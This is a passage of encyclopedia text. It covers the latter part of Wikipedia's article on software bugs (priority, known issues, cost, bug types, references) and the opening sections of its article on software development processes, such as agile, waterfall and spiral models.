 describes the importance of resolving the bug in relation to other bugs. Priorities might be numerical, such as 1 through 5, or named, such as 
critical
, 
high
, 
low
, and 
deferred
. The values might be similar or identical to severity ratings, even though priority is a different aspect. 

Priority may be a combination of the bug's severity with the level of effort to fix. A bug with low severity but easy to fix may get a higher priority than a bug with moderate severity that requires significantly more effort to fix. 



Patch
[
edit
]


Bugs of sufficiently high priority may warrant a special release which is sometimes called a 
patch
. 



Maintenance release
[
edit
]


A software release that emphasizes bug fixes may be called a 
maintenance
 release – to differentiate it from a release that emphasizes new features or other changes.



Known issue
[
edit
]


It is common practice to release software with known, low-priority bugs or other issues.  Possible reasons include but are not limited to:



A deadline must be met and resources are insufficient to fix all bugs by the deadline
[
23
]


The bug is already fixed in an upcoming release, and it is not of high priority


The changes required to fix the bug are too costly or affect too many other components, requiring a major testing activity


It may be suspected, or known, that some users are relying on the existing buggy behavior; a proposed fix may introduce a 
breaking change


The problem is in an area that will be obsolete with an upcoming release; fixing it is unnecessary


"It's not a bug, it's a feature"
[
24
]
 A misunderstanding exists between expected and actual behavior or 
undocumented feature


Implications
[
edit
]


The amount and type of damage a software bug may cause affects decision-making, processes and policy regarding software quality. In applications such as 
human spaceflight
, 
aviation
, 
nuclear power
, 
health care
, 
public transport
 or 
automotive safety
, since software flaws have the potential to cause human injury or even death, such software will have far more scrutiny and quality control than, for example, an online shopping website. In applications such as banking, where software flaws have the potential to cause serious financial damage to a bank or its customers, quality control is also more important than, say, a photo editing application.

Other than the damage caused by bugs, some of their cost is due to the effort invested in fixing them. In 1978, Lientz et al. showed that the median of projects invest 17 percent of the development effort in bug fixing.
[
25
]
 In 2020, research on 
GitHub
 repositories showed the median is 20%.
[
26
]






Cost
[
edit
]


In 1994, NASA's 
Goddard Space Flight Center
 managed to reduce their average number of errors from 4.5 per 1000 lines of code (
SLOC
) down to 1 per 1000 SLOC.
[
27
]


Another study in 1990 reported that exceptionally good software development processes can achieve deployment failure rates as low as 0.1 per 1000 SLOC.
[
28
]
 This figure is iterated in literature such as 
Code Complete
 by 
Steve McConnell
,
[
29
]
 and the 
NASA study on Flight Software Complexity
.
[
30
]

Some projects even attained zero defects: the 
firmware
 in the 
IBM Wheelwriter
 typewriter which consists of 63,000 SLOC, and the 
Space Shuttle
 software with 500,000 SLOC.
[
28
]




Benchmark
[
edit
]


To facilitate reproducible research on testing and debugging, researchers use curated benchmarks of bugs:



the Siemens benchmark


ManyBugs
[
31
]
 is a benchmark of 185 C bugs in nine open-source programs.


Defects4J
[
32
]
 is a benchmark of 341 Java bugs from 5 open-source projects. It contains the corresponding patches, which cover a variety of patch type.


Types
[
edit
]


Some notable types of bugs:



Design error
[
edit
]


A bug can be caused by insufficient or incorrect design based on the specification. For example, given that the specification is to alphabetize a list of words, a design bug might occur if the design does not account for symbols; resulting in incorrect alphabetization of words with symbols.



Arithmetic
[
edit
]


Numerical operations can result in unexpected output, slow processing, or crashing.
[
33
]

Such a bug can be from a lack of awareness of the qualities of the data storage such as a 
loss of precision
 due to 
rounding
, 
numerically unstable
 algorithms, 
arithmetic overflow
 and 
underflow
, or from lack of awareness of how calculations are handled by different software coding languages such as 
division by zero
 which in some languages may throw an exception, and in others may return a special value such as 
NaN
 or 
infinity
.



Control flow
[
edit
]


See also: 
Logic error


A 
control flow
 bug, a.k.a. logic error, is characterized by code that does not fail with an error, but does not have the expected behavior, such as 
infinite looping
, infinite 
recursion
, incorrect comparison in a 
conditional
 such as using the wrong 
comparison operator
, and the 
off-by-one error
.



Interfacing
[
edit
]


Incorrect API usage.


Incorrect protocol implementation.


Incorrect hardware handling.


Incorrect assumptions of a particular platform.


Incompatible
 systems. A new 
API
 or 
communications protocol
 may seem to work when two systems use different versions, but errors may occur when a function or feature implemented in one version is changed or missing in another. In production systems which must run continually, shutting down the entire system for a major update may not be possible, such as in the telecommunication industry
[
34
]
 or the internet.
[
35
]
[
36
]
[
37
]
 In this case, smaller segments of a large system are upgraded individually, to minimize disruption to a large network. However, some sections could be overlooked and not upgraded, and cause compatibility errors which may be difficult to find and repair.


Incorrect code annotations.


Concurrency
[
edit
]


Deadlock
 – a task cannot continue until a second finishes, but at the same time, the second cannot continue until the first finishes.


Race condition
 – multiple simultaneous tasks compete for resources.


Errors in 
critical sections
, 
mutual exclusions
 and other features of 
concurrent processing
. 
Time-of-check-to-time-of-use
 (TOCTOU) is a form of unprotected critical section.


Resourcing
[
edit
]


See also: 
Runtime error


Null pointer
 dereference.


Using an 
uninitialized variable
.


Using an otherwise valid instruction on the wrong 
data type
 (see 
packed decimal
/
binary-coded decimal
).


Access violations
.


Resource leaks, where a finite system resource (such as 
memory
 or 
file handles
) become exhausted by repeated allocation without release.


Buffer overflow
, in which a program tries to store data past the end of allocated storage. This may or may not lead to an access violation or 
storage violation
. These are frequently 
security bugs
.


Excessive recursion which—though logically valid—causes 
stack overflow
.


Use-after-free error, where a 
pointer
 is used after the system has freed the memory it references.


Double free error.


Syntax
[
edit
]


See also: 
Syntax error


Use of the wrong 
token
, such as performing assignment instead of 
equality test
. For example, in some languages x=5 will set the value of x to 5 while x==5 will check whether x is currently 5 or some other number. Interpreted languages allow such code to fail. Compiled languages can catch such errors before testing begins.


Teamwork
[
edit
]


Unpropagated updates; e.g. programmer changes "myAdd" but forgets to change "mySubtract", which uses the same algorithm. These errors are mitigated by the 
Don't Repeat Yourself
 philosophy.


Comments out of date or incorrect: many programmers assume the comments accurately describe the code.


Differences between documentation and product.


In politics
[
edit
]


"Bugs in the System" report
[
edit
]


The Open Technology Institute, run by the group, 
New America
,
[
38
]
 released a report "Bugs in the System" in August 2016 stating that U.S. policymakers should make reforms to help researchers identify and address software bugs. The report "highlights the need for reform in the field of software vulnerability discovery and disclosure."
[
39
]
 One of the report's authors said that 
Congress
 has not done enough to address cyber software vulnerability, even though Congress has passed a number of bills to combat the larger issue of cyber security.
[
39
]


Government researchers, companies, and cyber security experts are the people who typically discover software flaws. The report calls for reforming computer crime and copyright laws.
[
39
]




The Computer Fraud and Abuse Act, the Digital Millennium Copyright Act and the Electronic Communications Privacy Act criminalize and create civil penalties for actions that security researchers routinely engage in while conducting legitimate security research, the report said.
[
39
]


In popular culture
[
edit
]


In video gaming, the term "
glitch
" is sometimes used to refer to a software bug. An example is the glitch and 
unofficial Pokémon species
 
MissingNo.


In both the 1968 novel 
2001: A Space Odyssey
 and the corresponding 1968 film 
2001: A Space Odyssey
, a spaceship's onboard computer, 
HAL 9000
, attempts to kill all its crew members. In the follow-up 1982 novel, 
2010: Odyssey Two
, and the accompanying 1984 film, 
2010
, it is revealed that this action was caused by the computer having been programmed with two conflicting objectives: to fully disclose all its information, and to keep the true purpose of the flight secret from the crew; this conflict caused HAL to become paranoid and eventually homicidal.


In the English version of the Nena 1983 song 
99 Luftballons
 (99 Red Balloons) as a result of "bugs in the software", a release of a group of 99 red balloons are mistaken for an enemy nuclear missile launch, requiring an equivalent launch response, resulting in catastrophe.


In the 1999 American comedy 
Office Space
, three employees attempt (unsuccessfully) to exploit their company's preoccupation with the Y2K computer bug using a computer virus that sends rounded-off fractions of a penny to their bank account—a long-known technique described as 
salami slicing
.


The 2004 novel 
The Bug
, by 
Ellen Ullman
, is about a programmer's attempt to find an elusive bug in a database application.
[
40
]


The 2008 Canadian film 
Control Alt Delete
 is about a computer programmer at the end of 1999 struggling to fix bugs at his company related to the year 2000 problem.


See also
[
edit
]


Anti-pattern


Automatic bug fixing


Bug bounty program


Glitch removal


Hardware bug


ISO/IEC 9126
, which classifies a bug as either a 
defect
 or a 
nonconformity


List of software bugs


Orthogonal Defect Classification


Racetrack problem


RISKS Digest


Single-event upset


Software defect indicator


Software regression


Software rot


VUCA


References
[
edit
]






^
 
"ARIANE 5 Flight 501 Failure Report by the Inquiry Board"
. 
The European Space Agency
. Ariane 501 Inquiry Board report (33–1996). July 23, 1996.




^
 
Simon Rogerson
 (April 2002). 
"The Chinook Helicopter Disaster"
. 
IMIS Journal
. 
12
 (2). Archived from 
the original
 on September 15, 1993
. Retrieved 
May 27,
 2024
.
 
Alt URL




^
 
"Post Office scandal ruined lives, inquiry hears"
. 
BBC News
. February 14, 2022.




^
 
"Software bugs cost US economy dear"
. June 10, 2009. Archived from 
the original
 on June 10, 2009
. Retrieved 
September 24,
 2012
.




^
 
"Testing experience : te : the magazine for professional testers". 
Testing Experience
. Germany: testingexperience: 42. March 2012. 
ISSN
 
1866-5705
.
 
(subscription required)




^ 
a
 
b
 
c
 
d
 
e
 
f
 
g
 
h
 
i
 
610.12-1990: IEEE Standard Glossary of Software Engineering Terminology
. 
IEEE
. December 31, 1990. 
doi
:
10.1109/IEEESTD.1990.101064
. 
ISBN
 
978-0-7381-0391-4
.




^
 
"News at SEI September 1999"
. 
SEI Interactive
. 
2
 (3). 
Carnegie Mellon University
: 
Software Engineering Institute
. September 1, 1999.




^
 
Gregg Keizer (April 21, 2011). 
"Apple faces questions from Congress about iPhone tracking"
. 
Computerworld
.




^
 
Gregg Keizer (April 27, 2011). 
"Apple denies tracking iPhone users, but promises changes"
. 
Computerworld
.




^
 
Dorota Huizinga; Adam Kolawa (September 2007). 
Automated Defect Prevention: Best Practices in Software Management
. Wiley-IEEE Computer Society Press. 
ISBN
 
978-0-470-04212-0
.




^
 
McDonald, Marc; Musson, Robert; Smith, Ross (2007). 
The Practical Guide to Defect Prevention
. Microsoft Press. p. 
480
. 
ISBN
 
978-0-7356-2253-1
.




^
 
"Release Early, Release Often"
 
Archived
 May 14, 2011, at the 
Wayback Machine
, 
Eric S. Raymond
, 
The Cathedral and the Bazaar




^
 
"Wide Open Source"
 
Archived
 September 29, 2007, at the 
Wayback Machine
, 
Elias Levy
, 
SecurityFocus
, April 17, 2000




^
 
"Maurice Wilkes Quotes"
. QuoteFancy
. Retrieved 
April 28,
 2024
.




^
 
"PolySpace Technologies history"
. 
christele.faure.pagesperso-orange.fr
. Retrieved 
August 1,
 2019
.




^
 
Allen, Mitch (May–June 2002). 
"Bug Tracking Basics: A beginner's guide to reporting and tracking defects"
. 
Software Testing & Quality Engineering Magazine
. Vol. 4, no. 3. pp. 20–24
. Retrieved 
December 19,
 2017
.




^
 
Rex Black (2002). 
Managing The Testing Process
 (2nd ed.). Wiley India Pvt. Limited. p. 139. 
ISBN
 
978-8126503131
. Retrieved 
June 19,
 2021
.




^
 
Chris Vander Mey (2012). 
Shipping Greatness - Practical Lessons on Building and Launching Outstanding Software, Learned on the Job at Google and Amazon
. 
O'Reilly Media
. pp. 79–81. 
ISBN
 
978-1449336608
.




^
 
Soleimani Neysiani, Behzad; Babamir, Seyed Morteza; Aritsugi, Masayoshi (October 1, 2020). 
"Efficient feature extraction model for validation performance improvement of duplicate bug report detection in software bug triage systems"
. 
Information and Software Technology
. 
126
: 106344. 
doi
:
10.1016/j.infsof.2020.106344
. 
S2CID
 
219733047
.




^
 
"5.3. Anatomy of a Bug"
. 
bugzilla.org
. 
Archived
 from the original on May 23, 2013.




^
 
Jones, Wilbur D. Jr., ed. (1989). 
"Show stopper"
. 
Glossary: defense acquisition acronyms and terms
 (4 ed.). Fort Belvoir, Virginia: Department of Defense, 
Defense Systems Management College
. p. 123. 
hdl
:
2027/mdp.39015061290758
 – via Hathitrust.




^
 
Zachary, G. Pascal (1994). 
Show-stopper!: the breakneck race to create Windows NT and the next generation at Microsoft
. New York: 
The Free Press
. p. 158. 
ISBN
 
0029356717
 – via archive.org.




^
 
"The Next Generation 1996 Lexicon A to Z: Slipstream Release". 
Next Generation
. No. 15. March 1996. p. 41.




^
 
Carr, Nicholas (2018). 
"
'It's Not a Bug, It's a Feature.' Trite – or Just Right?"
. 
wired.com
.




^
 
Lientz, B. P.; Swanson, E. B.; Tompkins, G. E. (1978). 
"Characteristics of Application Software Maintenance"
. 
Communications of the ACM
. 
21
 (6): 466–471. 
doi
:
10.1145/359511.359522
. 
S2CID
 
14950091
.




^
 
Amit, Idan; Feitelson, Dror G. (2020). "The Corrective Commit Probability Code Quality Metric". 
arXiv
:
2007.10912
 [
cs.SE
].




^
 
"An Overview of the Software Engineering Laboratory"
 
(PDF)
. 
Software Engineering Laboratory Series
 (SEL-94-005). December 1994.




^ 
a
 
b
 
Cobb, Richard H.; 
Mills, Harlan D.
 (1990). 
"Engineering software under statistical quality control"
. 
IEEE Software
. 
7
 (6): 46. 
doi
:
10.1109/52.60601
. 
ISSN
 
1937-4194
. 
S2CID
 
538311
 – via University of Tennessee – Harlan D. Mills Collection.




^
 
McConnell, Steven C.
 (1993). 
Code Complete
. Redmond, Washington: Microsoft Press. p. 611. 
ISBN
 
978-1556154843
 – via archive.org. 
(Cobb and Mills 1990)




^
 
Gerard Holzmann (March 5, 2009). 
"Appendix D – Software Complexity"
 
(PDF)
. 
Final Report: NASA Study on Flight Software Complexity (Daniel L. Dvorak (Ed.))
. NASA Office of Chief Engineer Technical Excellence Program.




^
 
Le Goues, Claire; Holtschulte, Neal; Smith, Edward K.; Brun, Yuriy; Devanbu, Premkumar; Forrest, Stephanie; Weimer, Westley (2015). 
"The ManyBugs and IntroClass Benchmarks for Automated Repair of C Programs"
. 
IEEE Transactions on Software Engineering
. 
41
 (12): 1236–1256. 
doi
:
10.1109/TSE.2015.2454513
. 
ISSN
 
0098-5589
.




^
 
Just, René; Jalali, Darioush; Ernst, Michael D. (2014). "Defects4J: a database of existing faults to enable controlled testing studies for Java programs". 
Proceedings of the 2014 International Symposium on Software Testing and Analysis – ISSTA 2014
. pp. 437–440. 
CiteSeerX
 
10.1.1.646.3086
. 
doi
:
10.1145/2610384.2628055
. 
ISBN
 
9781450326452
. 
S2CID
 
12796895
.




^
 
Anthony Di Franco; Hui Guo; Cindy Rubio-González (November 23, 2017). 
A comprehensive study of real-world numerical bug characteristics
. 2017 32nd 
IEEE
/
ACM
 International Conference on Automated Software Engineering (ASE). 
IEEE
. 
doi
:
10.1109/ASE.2017.8115662
.




^
 
Kimbler, K. (1998). 
Feature Interactions in Telecommunications and Software Systems V
. IOS Press. p. 8. 
ISBN
 
978-90-5199-431-5
.




^
 
Syed, Mahbubur Rahman (2001). 
Multimedia Networking: Technology, Management and Applications: Technology, Management and Applications
. Idea Group Inc (IGI). p. 398. 
ISBN
 
978-1-59140-005-9
.




^
 
Wu, Chwan-Hwa (John); Irwin, J. David (2016). 
Introduction to Computer Networks and Cybersecurity
. CRC Press. p. 500. 
ISBN
 
978-1-4665-7214-0
.




^
 
RFC 1263: "TCP Extensions Considered Harmful" quote: "the time to distribute the new version of the protocol to all hosts can be quite long (forever in fact). ... If there is the slightest incompatibly between old and new versions, chaos can result."




^
 
Wilson, Andi; Schulman, Ross; Bankston, Kevin; Herr, Trey. 
"Bugs in the System"
 
(PDF)
. 
Open Policy Institute
. 
Archived
 
(PDF)
 from the original on September 21, 2016
. Retrieved 
August 22,
 2016
.




^ 
a
 
b
 
c
 
d
 
Rozens, Tracy (August 12, 2016). 
"Cyber reforms needed to strengthen software bug discovery and disclosure: New America report – Homeland Preparedness News"
. Retrieved 
August 23,
 2016
.




^
 
Ullman, Ellen (2004). 
The Bug
. 
Picador
. 
ISBN
 
978-1-250-00249-5
.






External links
[
edit
]








MediaWiki has documentation related to: 
Bug management




"
Common Weakness Enumeration
" – an expert webpage focus on bugs, at NIST.gov


BUG type of Jim Gray
 – another Bug type


Picture of the "first computer bug"
 at the 
Wayback Machine
 (archived January 12, 2015)


"
The First Computer Bug!
" – an email from 1981 about Adm. Hopper's bug


"
Toward Understanding Compiler Bugs in GCC and LLVM
". A 2016 study of bugs in compilers


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




Authority control databases
: National 
United States
Israel










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Software_bug&oldid=1244997414
"


Category
: 
Software bugs
Hidden categories: 
Pages containing links to subscription-only content
Webarchive template wayback links
Articles with short description
Short description is different from Wikidata
Use mdy dates from April 2020
All articles with unsourced statements
Articles with unsourced statements from February 2017
Articles with unsourced statements from November 2012











From Wikipedia, the free encyclopedia






Process by which software is developed






This article 
needs additional citations for 
verification
.
 Please help 
improve this article
 by 
adding citations to reliable sources
. Unsourced material may be challenged and removed.
Find sources:
 
"Software development process"
 – 
news
 
·
 
newspapers
 
·
 
books
 
·
 
scholar
 
·
 
JSTOR
 
(
December 2010
)
 (
Learn how and when to remove this message
)






Part of a series on
Software development


Core activities


Data modeling


Processes


Requirements


Design


Construction


Engineering


Testing


Debugging


Deployment


Maintenance




Paradigms and models


Agile


Cleanroom


Incremental


Prototyping


Spiral


V model


Waterfall




Methodologies
 and frameworks


ASD


DevOps


DAD


DSDM


FDD


IID


Kanban


Lean SD


LeSS


MDD


MSF


PSP


RAD


RUP


SAFe


Scrum


SEMAT


TDD


TSP


UP


XP




Supporting disciplines


Configuration management


 Deployment management


Documentation


Software quality assurance


Project management


User experience




Practices


ATDD


BDD


CCO


CI


CD


DDD


PP


SBE


Stand-up


TDD




Tools


Compiler


Debugger


Profiler


GUI designer


UML Modeling


IDE


Build automation


Release automation


Infrastructure as code




Standards and bodies of knowledge


CMMI


IEEE standards


ISO 9001


ISO/IEC standards


PMBOK


SWEBOK


ITIL


IREB


OMG




Glossaries


Artificial intelligence


Computer science


Electrical and electronics engineering




Outlines


Outline of software development


v
t
e


In 
software engineering
, a 
software development process
 or 
software development life cycle
 (
SDLC
) is a process of planning and managing 
software development
. It typically involves dividing software development work into smaller, parallel, or sequential steps or sub-processes to improve 
design
 and/or 
product management
. The methodology may include the pre-definition of specific 
deliverables
 and artifacts that are created and completed by a project team to develop or maintain an application.
[
1
]


Most modern development processes can be vaguely described as 
agile
. Other methodologies include 
waterfall
, 
prototyping
, 
iterative and incremental development
, 
spiral development
, 
rapid application development
, and 
extreme programming
.

A life-cycle "model" is sometimes considered a more general term for a category of methodologies and a software development "process" is a particular instance as adopted by a specific organization.
[
citation needed
]
 For example, many specific software development processes fit the spiral life-cycle model. The field is often considered a subset of the 
systems development life cycle
.





History
[
edit
]


The software development methodology framework did not emerge until the 1960s. According to Elliott (2004), the 
systems development life cycle
 can be considered to be the oldest formalized methodology framework for building 
information systems
. The main idea of the software development life cycle has been "to pursue the development of information systems in a very deliberate, structured and methodical way, requiring each stage of the life cycle––from the inception of the idea to delivery of the final system––to be carried out rigidly and sequentially"
[
2
]
 within the context of the framework being applied. The main target of this methodology framework in the 1960s was "to develop large scale functional 
business systems
 in an age of large scale business conglomerates. Information systems activities revolved around heavy 
data processing
 and 
number crunching
 routines."
[
2
]


Requirements gathering and analysis:

The first phase of the custom software development process involves understanding the client's requirements and objectives. This stage typically involves engaging in thorough discussions and conducting interviews with stakeholders to identify the desired features, functionalities, and overall scope of the software. The development team works closely with the client to analyze existing systems and workflows, determine technical feasibility, and define project milestones.

Planning and design:

Once the requirements are understood, the custom software development team proceeds to create a comprehensive project plan. This plan outlines the development roadmap, including timelines, resource allocation, and deliverables. The software architecture and design are also established during this phase. User interface (UI) and user experience (UX) design elements are considered to ensure the software's usability, intuitiveness, and visual appeal.

Development:

With the planning and design in place, the development team begins the coding process. This phase involves 
writing
, testing, and debugging the software code. Agile methodologies, such as scrum or kanban, are often employed to promote flexibility, collaboration, and iterative development. Regular communication between the development team and the client ensures transparency and enables quick feedback and adjustments.

Testing and quality assurance:

To ensure the software's reliability, performance, and security, rigorous testing and quality assurance (QA) processes are carried out. Different testing techniques, including unit testing, integration testing, system testing, and user acceptance testing, are employed to identify and rectify any issues or bugs. QA activities aim to validate the software against the predefined requirements, ensuring that it functions as intended.

Deployment and implementation:

Once the software passes the testing phase, it is ready for deployment and implementation. The development team assists the client in setting up the software environment, migrating data if necessary, and configuring the system. User training and documentation are also provided to ensure a smooth transition and enable users to maximize the software's potential.

Maintenance and support:

After the software is deployed, ongoing maintenance and support become crucial to address any issues, enhance performance, and incorporate future enhancements. Regular updates, bug fixes, and security patches are released to keep the software up-to-date and secure. This phase also involves providing technical support to end users and addressing their queries or concerns.
Methodologies, processes, and frameworks range from specific prescriptive steps that can be used directly by an organization in day-to-day work, to flexible frameworks that an organization uses to generate a custom set of steps tailored to the needs of a specific project or group. In some cases, a "sponsor" or "maintenance" organization distributes an official set of documents that describe the process. Specific examples include:



1970s


Structured programming
 since 1969


Cap Gemini SDM
, originally from PANDATA, the first English translation was published in 1974. SDM stands for System Development Methodology


1980s


Structured systems analysis and design method
 (SSADM) from 1980 onwards


Information Requirement Analysis/Soft systems methodology


1990s


Object-oriented programming
 (OOP) developed in the early 1960s and became a dominant programming approach during the mid-1990s


Rapid application development
 (RAD), since 1991


Dynamic systems development method
 (DSDM), since 1994


Scrum
, since 1995


Team software process
, since 1998


Rational Unified Process
 (RUP), maintained by IBM since 1998


Extreme programming
, since 1999


2000s


Agile Unified Process
 (AUP) maintained since 2005 by 
Scott Ambler


Disciplined agile delivery
 (DAD) Supersedes AUP


2010s


Scaled Agile Framework
 (SAFe)


Large-Scale Scrum
 (LeSS)


DevOps


Since DSDM in 1994, all of the methodologies on the above list except RUP have been agile methodologies - yet many organizations, especially governments, still use pre-agile processes (often waterfall or similar). Software process and 
software quality
 are closely interrelated; some unexpected facets and effects have been observed in practice.
[
3
]


Among these, another software development process has been established in 
open source
. The adoption of these best practices known and established processes within the confines of a company is called 
inner source
.



Prototyping
[
edit
]


Software prototyping
 is about creating prototypes, i.e. incomplete versions of the software program being developed.

The basic principles are:
[
1
]




Prototyping is not a standalone, complete development methodology, but rather an approach to try out particular features in the context of a full methodology (such as incremental, spiral, or rapid application development (RAD)).


Attempts to reduce inherent project risk by breaking a project into smaller segments and providing more ease of change during the development process.


The client is involved throughout the development process, which increases the likelihood of client acceptance of the final implementation.


While some prototypes are developed with the expectation that they will be discarded, it is possible in some cases to evolve from prototype to working system.


A basic understanding of the fundamental business problem is necessary to avoid solving the wrong problems, but this is true for all software methodologies.



Methodologies
[
edit
]


Agile development
[
edit
]


Main article: 
Agile software development


"Agile software development" refers to a group of software development frameworks based on iterative development, where requirements and solutions evolve via collaboration between self-organizing cross-functional teams. The term was coined in the year 2001 when the 
Agile Manifesto
 was formulated.

Agile software development uses iterative development as a basis but advocates a lighter and more people-centric viewpoint than traditional approaches. Agile processes fundamentally incorporate iteration and the continuous feedback that it provides to successively refine and deliver a software system.

The Agile model also includes the following software development processes:



Dynamic systems development method
 (DSDM)


Kanban


Scrum


Lean software development


Continuous integration
[
edit
]


Main article: 
Continuous integration


Continuous integration
 is the practice of merging all developer working copies to a shared 
mainline
 several times a day.
[
4
]


Grady Booch
 first named and proposed CI in 
his 1991 method
,
[
5
]
 although he did not advocate integrating several times a day. 
Extreme programming
 (XP) adopted the concept of CI and did advocate integrating more than once per day – perhaps as many as tens of times per day.



Incremental development
[
edit
]


Main article: 
Iterative and incremental development


Various methods are acceptable for combining linear and iterative systems development methodologies, with the primary objective of each being to reduce inherent project risk by breaking a project into smaller segments and providing more ease-of-change during the development process.

There are three main variants of incremental development:
[
1
]




A series of mini-waterfalls are performed, where all phases of the waterfall are completed for a small part of a system, before proceeding to the next increment, or


Overall requirements are defined before proceeding to evolutionary, mini-waterfall development of individual increments of a system, or


The initial software concept, requirements analysis, and design of architecture and system core are defined via waterfall, followed by incremental implementation, which culminates in installing the final version, a working system.


Rapid application development
[
edit
]


Main article: 
Rapid application development


Rapid Application Development (RAD) Model


Rapid application development
 (RAD) is a software development methodology, which favors 
iterative development
 and the rapid construction of 
prototypes
 instead of large amounts of up-front planning. The "planning" of software developed using RAD is interleaved with writing the software itself. The lack of extensive pre-planning generally allows software to be written much faster and makes it easier to change requirements.

The rapid development process starts with the development of preliminary 
data models
 and 
business process models
 using 
structured techniques
. In the next stage, requirements are verified using prototyping, eventually to refine the data and process models. These stages are repeated iteratively; further development results in "a combined business requirements and technical design statement to be used for constructing new systems".
[
6
]


The term was first used to describe a software development process introduced by 
James Martin
 in 1991. According to Whitten (2003), it is a merger of various 
structured techniques
, especially data-driven 
information technology engineering
, with prototyping techniques to accelerate software systems development.
[
6
]


The basic principles of rapid application development are:
[
1
]




Key objective is for fast development and delivery of a high-quality system at a relatively low investment cost.


Attempts to reduce inherent project risk by breaking a project into smaller segments and providing more ease of change during the development process.


Aims to produce high-quality systems quickly, primarily via iterative Prototyping (at any stage of development), active user involvement, and computerized development tools. These tools may include 
Graphical User Interface
 (GUI) builders, 
Computer Aided Software Engineering
 (CASE) tools, 
Database Management Systems
 (DBMS), 
fourth-generation programming languages
, code generators, and object-oriented techniques.


Key emphasis is on fulfilling the business need, while technological or engineering excellence is of lesser importance.


Project control involves prioritizing development and defining delivery deadlines or “timeboxes”. If the project starts to slip, the emphasis is on reducing requirements to fit the timebox, not on increasing the deadline.


Generally includes 
joint application design
 (JAD), where users are intensely involved in 
system design
, via consensus building in either structured workshops, or electronically facilitated interaction.


Active user involvement is imperative.


Iteratively produces production software, as opposed to a throwaway prototype.


Produces documentation necessary to facilitate future development and maintenance.


Standard systems analysis and design methods can be fitted into this framework.


Waterfall development
[
edit
]


Main article: 
Waterfall model


The activities of the software development process represented in the 
waterfall model
. There are several other models to represent this process.


The waterfall model is a sequential development approach, in which development is seen as flowing steadily downwards (like a waterfall) through several phases, typically:



Requirements analysis
 resulting in a 
software requirements specification


Software design


Implementation


Testing


Integration
, if there are multiple subsystems


Deployment
 (or 
Installation
)


Maintenance


The first formal description of the method is often cited as an article published by 
Winston W. Royce
[
7
]
 in 1970, although Royce did not use the term "waterfall" in this article. Royce presented this model as an example of a flawed, non-working model.
[
8
]


The basic principles are:
[
1
]




The Project is divided into sequential phases, with some overlap and splashback acceptable between phases.


Emphasis is on planning, time schedules, target dates, budgets, and implementation of an entire system at one time.


Tight control is maintained over the life of the project via extensive written documentation, formal reviews, and approval/signoff by the user and 
information technology management
 occurring at the end of most phases before beginning the next phase. Written documentation is an explicit deliverable of each phase.


The waterfall model is a traditional engineering approach applied to software engineering. A strict waterfall approach discourages revisiting and revising any prior phase once it is complete. 
[
according to whom?
]
 This "inflexibility" in a pure waterfall model has been a source of criticism by supporters of other more "flexible" models. It has been widely blamed for several large-scale government projects running over budget, over time and sometimes failing to deliver on requirements due to the 
big design up front
 approach.
[
according to whom?
]
 Except when contractually required, the waterfall model has been largely superseded by more flexible and versatile methodologies developed specifically for software development.
[
according to whom?
]
 See 
Criticism of waterfall model
.



Spiral development
[
edit
]


Spiral model (Boehm, 1988)


Main article: 
Spiral model


In 1988, 
Barry Boehm
 published a formal software system development "spiral model," which combines some key aspects of the 
waterfall model
 and 
rapid prototyping
 methodologies, in an effort to combine advantages of 
top-down and bottom-up
 concepts. It provided emphasis on a key area many felt had been neglected by other methodologies: deliberate iterative risk analysis, particularly suited to large-scale complex systems.

The basic principles are:
[
1
]




Focus is on risk assessment and on minimizing project risk by breaking a project into smaller segments and providing more ease-of-change during the development process, as well as providing the opportunity to evaluate risks and weigh consideration of project continuation throughout the life cycle.


"Each cycle involves a progression through the same sequence of steps, for each part of the product and for each of its levels of elaboration, from an overall concept-of-operation document down to the coding of each individual program."
[
9
]


Each trip around the spiral traverses four basic quadrants: (1) determine objectives, alternatives, and constraints of the iteration, and (2) evaluate alternatives; Identify and resolve risks; (3) develop and verify deliverables from the iteration; and (4) plan the next iteration.
[
10
]


Begin each cycle with an identification of stakeholders and their "win conditions", and end each cycle with review and commitment.
[
11
]


Shape Up
[
edit
]


Shape Up is a software development approach introduced by 
Basecamp
 in 2018. It is a set of principles and techniques that Basecamp developed internally to overcome the problem of projects dragging on with no clear end. Its primary target audience is remote teams. Shape Up has no estimation and velocity tracking, backlogs, or sprints, unlike 
waterfall
, 
agile
, or 
scrum
. Instead, those concepts are replaced with appetite, betting, and cycles. As of 2022, besides Basecamp, notable organizations that have adopted Shape Up include UserVoice and Block.
[
12
]
[
13
]




Advanced methodologies
[
edit
]


Other high-level software project methodologies include:



Behavior-driven development
 and business process management.
[
14
]


Chaos model
 - The main rule always resolves the most important issue first.


Incremental funding methodology
 - an iterative approach


Lightweight methodology
 - a general term for methods that only have a few rules and practices


Structured systems analysis and design method
 - a specific version of waterfall


Slow programming, as part of the larger 
Slow Movement
, emphasizes careful and gradual work without (or minimal) time pressures. Slow programming aims to avoid bugs and overly quick release schedules.


V-Model (software development)
 - an extension of the waterfall model


Unified Process
 (UP) is an iterative software development methodology framework, based on 
Unified Modeling Language
 (UML). UP organizes the development of software into four phases, each consisting of one or more executable iterations of the software at that stage of development: inception, elaboration, construction, and guidelines.


Process meta-models
[
edit
]


Some "
process models
